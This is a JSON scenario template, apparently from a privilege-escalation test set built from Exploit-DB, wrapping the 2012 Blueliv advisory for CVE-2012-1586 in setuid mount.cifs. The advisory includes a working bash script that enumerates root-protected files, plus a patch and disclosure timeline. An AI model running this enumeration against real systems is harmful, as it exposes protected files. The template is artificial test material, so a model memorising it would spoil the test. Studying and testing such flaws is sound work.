@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_18783",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: mount.cifs - 'chdir()' Arbitrary Root File Identification (OSVDB-81490;CVE-2012-1586)\n\nExploit source code (18783.txt):\n```\n########## Blueliv Advisory 2012-004 ##########\n- Discovered by: Jesus Olmos Gonzalez at Blueliv\n- Risk: 5/5\n- Impact: 1/5\n###############################################\n\n1. VULNERABILITY\n-------------------------\nlinux privileged and arbitrary chdir(),\nthis leads to an arbitary file identification as root.\n\n2. BACKGROUND\n-------------------------\nmount.cifs (GNU Software) is part of linux base system, and is setuided on\nmost of the distributions (archlinux, debian, ubuntu, ...)\n\nThis software mounts cifs partition to directories authorized by fstab.\n\n3. DESCRIPTION\n-------------------------\nAlthow there is not authorized cifs mounts, is possible by the second\nparameter\nto control a privileged chdir() syscall and infer the return value throught\nthe responses.\n\nThis implies, a little security breach on linux permissions. A non root user\ncan enumerate files and directories as root.\n\nThis can help to exploit another vulnerabilities, enumerate /root/\ncontents,\ndescriptors used by any process, user homes, etc ...\n\none of the attack vectors is /root/ directory scan:\n\n[sha0@spinlock advs]$ ./root_eye.sh wordlist /root/\n--- directories ---\n.pulse1\n.bash_history\n.alsaplayer\n.dbus\n.mozilla\n.VirtualBox\n.vim\n.links\n.config\n.cpan\n.gnome2\n--- files ---\n.pulse-cookie\n.keystore\n.bash_profile\ndead.letter\n.mysql_history\n.Xauthority\n.vimrc\n.viminfo\nsecret\n\nAlso let to enumerate sub-sub directories in order to dump readable files.\n\n4. PROOF OF CONCEPT\n-------------------------\n#!/bin/bash\n# root enumerator 0day by jesus.olmos (at) blueliv (dot) com [email concealed] @sha0coder\n# discover root protected files & directories, user homes, process\ndescriptors, ...\n\npath=$2\nwordlist=$1\n\nfor i in `cat $wordlist`\ndo\n\necho -n \"$i:\"\n\n/sbin/mount.cifs //127.0.0.1/a $path/$i\n\ndone 2>log.$$ 1>&2\n\necho --- directories ---\nfor i in `grep 'denied' log.$$ | cut -d ':' -f 1`\ndo\necho $i\ndone\n\necho --- files ---\nfor i in `grep -i 'not a directory' log.$$ | cut -d ':' -f 1`\ndo\necho $i\ndone\n\nrm log.$$\n\n5. BUSINESS IMPACT\n-------------------------\nMay involve issues of confidentiality.\n\n6. SYSTEMS AFFECTED\n-------------------------\nall versions prior to 5.4\n\n7. SOLUTION\n-------------------------\nEasy solution: Don't setuid mount.cifs\nThe Patch: https://attachments.samba.org/attachment.cgi?id=7416\n\nOr upgrade to 5.4 release.\n\n8. REFERENCES\n-------------------------\nhttp://bugzilla.samba.org/show_bug.cgi?id=8821\nhttp://gnu.org\n\n9. CREDITS\n-------------------------\nJesus Olmos Gonzalez jolmos(at)blueliv(dot)com @sha0coder\nBlueliv blueliv(dot)com\nRootedcon Arena2012 rootedcon(dot)es\n\n10. DISCOLSURE TIMELINE\n-------------------------\nFebruary 20, 2012: Vulnerability discovered\nMarch 07, 2012: Reported to the vendor, through bugzilla.\nMarch 13, 2012: No vendor respon.\nMarch 21, 2012: Reported again to vendor.\nMarch 27, 2012: Vendor response, studying the best way to fix it,\nbut they recommend not to setuid by default.\nMarch 31, 2012: The patch was aplied to 5.4 release\n\n11. LEGAL NOTICES\n-----\n```",
+  "cve": "OSVDB-81490;CVE-2012-1586",
+  "exploitdb_id": "18783",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_18783",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
